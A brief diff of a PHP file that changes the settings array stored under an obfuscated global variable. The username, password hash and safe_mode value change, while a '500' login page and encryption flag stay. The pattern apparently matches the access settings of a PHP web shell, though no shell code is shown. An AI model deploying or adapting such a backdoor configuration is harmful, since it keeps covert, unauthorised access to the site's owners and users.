@@ -7,9 +7,9 @@
 	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'saul',
-    'password' => '61bf1611fbe77127822e0c247784641c',
-    'safe_mode' => '0',
+    'username' => 'death',
+    'password' => '2e8d6dbf9112a879d4ceb15403d10a78',
+    'safe_mode' => '1',
     'login_page' => '500',
     'show_icons' => '1',
     'post_encryption' => false,
